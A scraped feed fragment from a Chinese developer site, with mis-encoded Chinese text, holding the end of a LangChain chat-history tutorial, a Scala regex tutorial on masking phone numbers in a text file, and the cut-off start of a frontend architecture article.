    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ai"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½cccï¼å¾ˆé«˜å…´è®¤è¯†ä½ ï¼Œæœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"invalid_tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<h3 data-id="heading-14">äº”ã€å¸¸ç”¨ API æ–¹æ³•</h3>
<h4 data-id="heading-15">InMemoryChatMessageHistory / FileChatMessageHistory å…±æœ‰æ–¹æ³•ï¼š</h4>






























<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>add_user_message(message)</code></td><td>æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</td><td><code>chat_history.add_user_message("ä½ å¥½")</code></td></tr><tr><td><code>add_ai_message(message)</code></td><td>æ·»åŠ  AI æ¶ˆæ¯</td><td><code>chat_history.add_ai_message("ä½ å¥½ï¼")</code></td></tr><tr><td><code>messages</code> å±æ€§</td><td>è·å–æ‰€æœ‰æ¶ˆæ¯</td><td><code>chat_history.messages</code></td></tr><tr><td><code>clear()</code></td><td>æ¸…ç©ºå†å²</td><td><code>chat_history.clear()</code></td></tr></tbody></table>
<h3 data-id="heading-16">å…­ã€ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h3>



































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èç»„ä»¶</th><th>åŸå› </th></tr></thead><tbody><tr><td>ç®€å•å¯¹è¯æœºå™¨äºº</td><td>InMemoryChatMessageHistory</td><td>æ— éœ€æŒä¹…åŒ–ï¼Œç®€å•å¿«é€Ÿ</td></tr><tr><td>å®¢æœç³»ç»Ÿ</td><td>FileChatMessageHistory</td><td>éœ€è¦ä¿å­˜å¯¹è¯è®°å½•</td></tr><tr><td>èŠå¤©åº”ç”¨</td><td>FileChatMessageHistory</td><td>ç”¨æˆ·éœ€è¦å†å²è®°å½•</td></tr><tr><td>ä¸€æ¬¡æ€§ä»»åŠ¡</td><td>InMemoryChatMessageHistory</td><td>æ— éœ€ä¿å­˜å†å²</td></tr><tr><td>æµ‹è¯•å¼€å‘</td><td>InMemoryChatMessageHistory</td><td>æ–¹ä¾¿è°ƒè¯•ï¼Œé‡å¯å³æ¸…ç©º</td></tr></tbody></table>
<h3 data-id="heading-17">ä¸ƒã€æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>æ–‡ä»¶å­˜å‚¨è·¯å¾„</strong>ï¼šä½¿ç”¨ <code>FileChatMessageHistory</code> æ—¶ç¡®ä¿ç¨‹åºæœ‰æ–‡ä»¶è¯»å†™æƒé™</li>
<li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šå¤§é‡å¯¹è¯å†å²å¯èƒ½å½±å“å“åº”é€Ÿåº¦ï¼Œå¯è€ƒè™‘å®ç°å†å²æ¶ˆæ¯æˆªæ–­ç­–ç•¥</li>
<li><strong>å®‰å…¨æ€§</strong>ï¼šæ–‡ä»¶å­˜å‚¨æ—¶æ³¨æ„æ•æ„Ÿä¿¡æ¯çš„ä¿æŠ¤</li>
<li><strong>å¹¶å‘é—®é¢˜</strong>ï¼šå¤šè¿›ç¨‹/çº¿ç¨‹è®¿é—®åŒä¸€æ–‡ä»¶æ—¶éœ€è¦åŠ é”æœºåˆ¶</li>
</ol>
<h3 data-id="heading-18">å…«ã€æ‰©å±•çŸ¥è¯†</h3>
<p>LangChain è¿˜æ”¯æŒå…¶ä»– ChatMessage å†å²å­˜å‚¨æ–¹å¼ï¼š</p>
<ul>
<li><strong>SQLChatMessageHistory</strong> - æ•°æ®åº“å­˜å‚¨</li>
<li><strong>RedisChatMessageHistory</strong> - Redis ç¼“å­˜å­˜å‚¨</li>
<li><strong>MongoDBChatMessageHistory</strong> - MongoDB å­˜å‚¨</li>
<li><strong>PostgreSQLChatMessageHistory</strong> - PostgreSQL å­˜å‚¨</li>
</ul>
<p>è¿™äº›éƒ½éœ€è¦é¢å¤–çš„ä¾èµ–å’Œé…ç½®ï¼Œé€‚åˆç”Ÿäº§ç¯å¢ƒçš„å¤§è§„æ¨¡åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€]]></title>    <link>https://juejin.cn/post/7592520539152220169</link>    <guid>https://juejin.cn/post/7592520539152220169</guid>    <pubDate>2026-01-08T01:13:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152220169" data-draft-id="7592497088791592987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€"/> <meta itemprop="keywords" content="ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-08T01:13:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆåŸºé—»"/> <meta itemprop="url" content="https://juejin.cn/user/1584857862123275"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æƒ³è¦æ›´å¤šï¼Œé‚£å°±â€œå¤šç»§æ‰¿â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1584857862123275/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆåŸºé—»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:13:43.000Z" title="Thu Jan 08 2026 01:13:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-markdown" lang="markdown">ç›®æ ‡ï¼šæ‰‹æœºå·æ‰“ç 
<span class="hljs-bullet">*</span>          136612345678  -&gt;  136<span class="hljs-strong">****</span>5678
<span class="hljs-bullet">*</span> ä»»åŠ¡ï¼šä»æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œè¯»å–ä¸€æ®µå†…å®¹ï¼ŒæŠŠå…¶ä¸­çš„æ‰‹æœºå·è¯†åˆ«å‡ºæ¥ï¼Œå¹¶æ‰“ç 
</code></pre>
<p>å…ˆå»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶Â <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bcdf29eb8954c8ea895fd19d86baa4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI5Z-66Ze7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768439623&amp;x-signature=XCBF4bZKVNHhFGCooeOsC9lzWeI%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "<span class="hljs-number">1</span><span class="hljs-selector-attr">[35678]</span>\d{<span class="hljs-number">9</span>}"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">//    åŒ¹é…è¾“å‡º</span>
    reg<span class="hljs-selector-class">.findAllIn</span>(content)<span class="hljs-selector-class">.foreach</span>(println)
  }
</code></pre>
<h6 data-id="heading-0">replaceAllInï¼Œå…¨éƒ¨æ›¿æ¢</h6>
<pre><code class="hljs language-ini" lang="ini">   æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯
    val <span class="hljs-attr">newContent</span> = reg.replaceAllIn(content,<span class="hljs-string">"è¿™æœ‰ä¸ªæ‰‹æœºå·"</span>)
</code></pre>
<h5 data-id="heading-1">æ›´æ”¹åï¼š</h5>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "<span class="hljs-number">1</span><span class="hljs-selector-attr">[35678]</span>\d{<span class="hljs-number">9</span>}"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">////    åŒ¹é…è¾“å‡º</span>
<span class="hljs-comment">//    reg.findAllIn(content).foreach(println)</span>
<span class="hljs-comment">////    æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯</span>
<span class="hljs-comment">//    replaceAllIn,å…¨éƒ¨æ›¿æ¢</span>
<span class="hljs-comment">//    åœ¨contentä¸­é€šè¿‡æ­£åˆ™å»æ‰¾å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†ä¹‹åï¼Œå°±æ¢æˆæŒ‡å®šçš„å†…å®¹ï¼Œå¹¶æŠŠæœ€ç»ˆçš„ç»“æœä¿å­˜åˆ°newContent</span>
<span class="hljs-comment">//    val newContent = reg.replaceAllIn(content,"è¿™æœ‰ä¸ªæ‰‹æœºå·")</span>
    val newContent = reg<span class="hljs-selector-class">.replaceAllIn</span>(content,m =&gt;{
//      println(s"åœ¨replaceAllInå‡½æ•°ä¸­ï¼Œæ‰¾åˆ°çš„å†…å®¹æ˜¯ï¼š${mat}")
<span class="hljs-comment">//      "æ‰‹æœºå·ï¼š" + m</span>
<span class="hljs-comment">//      mçš„å‰ä¸‰ä½ + "****" + mçš„åå››ä½</span>
      m<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) + "****" + m<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">7</span>)
    })

    <span class="hljs-built_in">println</span>("æ›¿æ¢åçš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(newContent)
  }
</code></pre>
<h5 data-id="heading-2">---------------------------------------------------------------------------------------------------------</h5>
<h5 data-id="heading-3">å†æ¬¡ä¼˜åŒ–å</h5>
<pre><code class="hljs language-scss" lang="scss">  def <span class="hljs-selector-tag">main</span>(args: Array[String]): Unit = {
    val <span class="hljs-attribute">content</span> = scala<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Source</span><span class="hljs-selector-class">.fromFile</span>("address.txt")<span class="hljs-selector-class">.mkString</span>

    <span class="hljs-built_in">println</span>("è¯»å…¥è¿›æ¥çš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(content)

<span class="hljs-comment">//    å†™ä¸€ä¸ªæ‰‹æœºå·çš„æ­£åˆ™</span>
    val reg = "(<span class="hljs-number">1</span>[<span class="hljs-number">35678</span>]\d{<span class="hljs-number">2</span>})(\d{<span class="hljs-number">3</span>})(\d{<span class="hljs-number">4</span>})"<span class="hljs-selector-class">.r</span>
<span class="hljs-comment">////    åŒ¹é…è¾“å‡º</span>
<span class="hljs-comment">//    reg.findAllIn(content).foreach(println)</span>
<span class="hljs-comment">////    æ›¿æ¢ï¼šæ­£åˆ™çš„å…¸å‹çš„åº”ç”¨åœºæ™¯</span>
<span class="hljs-comment">//    replaceAllIn,å…¨éƒ¨æ›¿æ¢</span>
<span class="hljs-comment">//    åœ¨contentä¸­é€šè¿‡æ­£åˆ™å»æ‰¾å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†ä¹‹åï¼Œå°±æ¢æˆæŒ‡å®šçš„å†…å®¹ï¼Œå¹¶æŠŠæœ€ç»ˆçš„ç»“æœä¿å­˜åˆ°newContent</span>
<span class="hljs-comment">//    val newContent = reg.replaceAllIn(content,"è¿™æœ‰ä¸ªæ‰‹æœºå·")</span>
    val newContent = reg<span class="hljs-selector-class">.replaceAllIn</span>(content,m =&gt;{
      println(m.group(<span class="hljs-number">0</span>))<span class="hljs-comment">// å½“å‰æ­£åˆ™åŒ¹é…åˆ°å®Œæ•´çš„å†…å®¹</span>
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">1</span>))<span class="hljs-comment">// å½“å‰æ­£åˆ™çš„ç¬¬ä¸€ä¸ªåˆ†ç»„ï¼ˆç¬¬ä¸€ä¸ªå°æ‹¬å·ï¼‰åŒ¹é…åˆ°çš„å†…å®¹</span>
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">2</span>))
      <span class="hljs-built_in">println</span>(m.group(<span class="hljs-number">3</span>))

      m<span class="hljs-selector-class">.group</span>(<span class="hljs-number">1</span>) + "***" + m<span class="hljs-selector-class">.group</span>(<span class="hljs-number">3</span>)
    })

    <span class="hljs-built_in">println</span>("æ›¿æ¢åçš„å†…å®¹æ˜¯ï¼š")
    <span class="hljs-built_in">println</span>(newContent)
  
    
<span class="hljs-comment">//    æŠŠæ›¿æ¢ä¹‹åçš„å†…å®¹ï¼Œå†™å…¥åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ä¸­</span>
    val fileWriter = new <span class="hljs-built_in">FileWriter</span>("newAddress.txt")
    fileWriter<span class="hljs-selector-class">.write</span>(newContent)
    fileWriter<span class="hljs-selector-class">.close</span>() 
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼]]></title>    <link>https://juejin.cn/post/7592520539152990217</link>    <guid>https://juejin.cn/post/7592520539152990217</guid>    <pubDate>2026-01-08T02:35:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152990217" data-draft-id="7592759902675091502" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-08T02:35:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¶æ„æ–¹æ³•ï¼ˆä¸‰ï¼‰ï¼šå‰ç«¯è®¾è®¡æ–‡æ¡£çš„å†™ä½œæ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:35:40.000Z" title="Thu Jan 08 2026 02:35:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body 